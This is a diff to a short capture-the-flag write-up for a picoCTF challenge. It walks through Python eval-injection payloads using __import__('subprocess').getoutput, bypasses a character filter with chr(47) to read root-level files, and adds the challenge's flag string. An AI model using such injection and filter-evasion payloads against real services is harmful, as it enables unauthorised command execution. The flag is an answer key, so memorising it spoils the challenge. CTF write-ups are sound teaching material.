@@ -19,7 +19,6 @@ __import__('os').system('echo hello')
 
 shit it is blocked, hmm lets try this:
 
-
 ```
 __import__('subprocess').getoutput('echo hello')
 ```
@@ -40,7 +39,7 @@ __import__('subprocess').getoutput('echo *')
 ```
 
 we can now see files! so the hint reveals we have to go to the root
-may let do 
+may let do
 
 ```
 __import__('subprocess').getoutput('cd / && head flag*')
@@ -52,4 +51,8 @@ no luck, maybe I can find a way to input characters using a trick?
 __import__('subprocess').getoutput("cd " + chr(47) + "&& head flag*")
 ```
 
-DONE! 
+DONE!
+
+```
+picoCTF{D0nt_Use_Unsecure_f@nctions3bc5aa53}
+```
